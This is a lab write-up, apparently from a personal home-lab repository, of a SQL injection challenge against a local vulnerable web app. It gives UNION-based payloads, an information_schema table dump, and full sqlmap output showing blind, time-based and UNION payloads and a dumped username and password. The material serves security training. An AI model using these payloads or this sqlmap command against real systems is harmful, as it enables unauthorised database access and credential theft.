# Challange (SQL-Injection)

By sending injection payload with the item name we get positive results.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/23adab84-1130-4437-ab58-bb83f4eea711)

On sending simple requests through Repeater we got the content length of 2516 with details of the product.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a4e03904-fe47-4f30-8d21-9b436dd97760)

On trying the Union query with payload: `' union select 1,2,3,4#` in the encoded form we get positive feedback.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a5ad3c57-3ec6-4a05-bb65-b2bb8f1f428c)

On trying to extract the version info get the version in return.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/0667ba7b-9e1e-482c-ad91-89a9752fd6ce)

Dump table names using the cmd:`'+union+select+1,2,3,table_name+from+information_schema.tables%23`

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/02c07a54-e718-477f-9069-d398b2bd4989)

Give a try with a tool called sqlmap, by coping request data to a file.

```bash
└─$ sqlmap -r challange -dump -T injection0x03_users
        ___
       __H__                                                                                                                                                                                                      
 ___ ___[(]_____ ___ ___  {1.7.6#stable}                                                                                                                                                                          
|_ -| . [(]     | .'| . |                                                                                                                                                                                         
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:08:31 /2023-07-15/

[11:08:31] [INFO] parsing HTTP request from 'challange'
[11:08:31] [INFO] resuming back-end DBMS 'mysql' 
[11:08:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: product (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: product=Senpai Knife Set' AND 9407=9407 AND 'fnVn'='fnVn

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: product=Senpai Knife Set' AND (SELECT 4059 FROM (SELECT(SLEEP(5)))pVIN) AND 'RYrH'='RYrH

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: product=Senpai Knife Set' UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6271,0x516b7148714f51565a6d724e736241747349735a4945614d6f6f76514f6769477065726c50526c58,0x71766b7871),NULL-- -
---
[11:08:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[11:08:31] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[11:08:31] [INFO] fetching current database
[11:08:31] [INFO] fetching columns for table 'injection0x03_users' in database 'peh-labs'
[11:08:31] [INFO] fetching entries for table 'injection0x03_users' in database 'peh-labs'
Database: peh-labs
Table: injection0x03_users
[1 entry]
+----------+------------------+
| username | password         |
+----------+------------------+
| takeshi  | onigirigadaisuki |
+----------+------------------+

[11:08:31] [INFO] table '`peh-labs`.injection0x03_users' dumped to CSV file '/home/singhx/.local/share/sqlmap/output/localhost/dump/peh-labs/injection0x03_users.csv'
[11:08:31] [INFO] fetched data logged to text files under '/home/singhx/.local/share/sqlmap/output/localhost'

[*] ending @ 11:08:31 /2023-07-15/


```

W00t Cracked...
